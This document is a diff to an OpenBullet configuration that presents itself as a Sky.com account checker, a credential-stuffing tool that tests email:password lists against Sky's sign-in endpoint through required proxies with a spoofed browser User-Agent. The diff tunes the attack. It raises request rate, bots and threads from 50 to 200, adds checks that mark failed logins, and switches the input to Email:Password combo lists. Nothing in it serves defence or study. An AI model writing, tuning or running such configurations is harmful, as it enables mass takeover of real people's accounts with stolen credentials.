@@ -6,7 +6,7 @@
     "CreationDate": "2025-11-19T08:17:00Z",
     "LastModified": "2025-11-19T08:17:00Z",
     "Version": "1.0.0",
-    "Description": "Sky.com account checker configuration with CPM 50, Bot 50, threading enabled, and multi-request support for OpenBullet"
+    "Description": "Advanced Sky.com account checker configuration with CPM 200, Bot 200, enhanced threading, and advanced multi-request support for OpenBullet"
   },
   "Settings": {
     "General": {
@@ -17,12 +17,11 @@
       "MaxRedirects": 8,
       "NeedsProxies": true,
       "OnlySocks": false,
-      "OnlySsl": false,
-      "MaxCPM": 50,
-      "SuggestedBots": 50,
+      "MaxCPM": 200,
+      "SuggestedBots": 200,
       "ThreadingEnabled": true,
       "MultiRequestSupport": true,
-      "ConcurrentRequests": 50,
+      "ConcurrentRequests": 200,
       "RequestTimeout": 10000,
       "RetryOnError": true,
       "MaxRetries": 3
@@ -45,20 +44,20 @@
     },
     "Threading": {
       "Enabled": true,
-      "MaxThreads": 50,
-      "ThreadPoolSize": 50,
+      "MaxThreads": 200,
+      "ThreadPoolSize": 200,
       "QueueSize": 1000,
       "UseThreadPool": true
     },
     "RateLimiting": {
       "Enabled": true,
-      "MaxCPM": 50,
+      "MaxCPM": 200,
       "EnforceRateLimit": true,
       "BurstAllowed": false
     },
     "MultiRequest": {
       "Enabled": true,
-      "MaxConcurrentRequests": 50,
+      "MaxConcurrentRequests": 200,
       "RequestQueueing": true,
       "KeepAlive": true,
       "ReuseConnections": true
@@ -75,7 +74,6 @@
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
           "Accept-Language": "en-US,en;q=0.5",
-          "Accept-Encoding": "gzip, deflate, br",
           "Connection": "keep-alive",
           "Upgrade-Insecure-Requests": "1"
         },
@@ -101,7 +99,6 @@
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
           "Accept": "application/json, text/plain, */*",
           "Accept-Language": "en-US,en;q=0.5",
-          "Accept-Encoding": "gzip, deflate, br",
           "Referer": "https://www.sky.com/signin",
           "Origin": "https://www.sky.com",
           "Connection": "keep-alive"
@@ -130,6 +127,16 @@
         }
       },
       {
+        "Type": "KeyCheck",
+        "Key": "<success>",
+        "Condition": "Contains",
+        "Value": "false",
+        "OnMatch": {
+          "Action": "FAIL",
+          "Message": "Invalid Account"
+        }
+      },
+      {
         "Type": "Parse",
         "Method": "LR",
         "LeftString": "\"message\":\"",
@@ -145,7 +152,7 @@
         "Condition": "Contains",
         "Value": "Invalid credentials",
         "OnMatch": {
-          "Action": "RETRY",
+          "Action": "FAIL",
           "Message": "Invalid Credentials"
         }
       },
@@ -241,11 +248,11 @@
     ]
   },
   "ConfigSpecs": {
-    "CPM": 50,
-    "Bots": 50,
+    "CPM": 200,
+    "Bots": 200,
     "Threading": "Enabled",
     "MultiRequest": "Enabled",
     "ProxyMode": "Required",
-    "InputFormat": "USERNAME:PASSWORD"
+    "InputFormat": "Email:Password"
   }
 }
